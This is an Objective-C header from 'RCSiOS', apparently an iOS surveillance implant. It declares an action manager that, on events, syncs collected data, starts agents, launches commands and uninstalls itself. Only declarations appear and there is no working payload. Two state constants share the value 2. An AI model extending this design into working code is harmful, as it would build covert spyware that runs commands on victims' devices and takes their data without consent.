/*
 * RCSiOS - Actions
 *  Provides all the actions which should be trigger upon an Event
 *
 *
 * Created on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import "RCSIConfManager.h"

#ifndef __RCSIActionManager_h__
#define __RCSIActionManager_h__

@interface _i_ActionManager : NSObject
{
  NSMutableArray  *mThreadArray;
  NSMutableArray  *actionsList;
  NSMutableArray  *mActionsMessageQueue;
  NSMachPort      *notificationPort;
  
#define ACTION_MANAGER_RUNNING  0
#define ACTION_MANAGER_STOPPING 2
#define ACTION_MANAGER_STOPPED  2
  int             actionManagerStatus;
  BOOL            isSynching;
}

@property (readonly) NSMachPort *notificationPort;

- (void)dispatchMsgToCore:(u_int)aType param:(u_int)aParam;
- (BOOL)tryActionSync:(NSMutableDictionary*)configuration;
- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag;
- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration;
- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration;

- (BOOL)start;
- (void)stop;

- (BOOL)triggerAction: (NSArray*)configArray;
- (BOOL)tryTriggerAction:(int)anActionID;
- (id)init;

@end

#endif
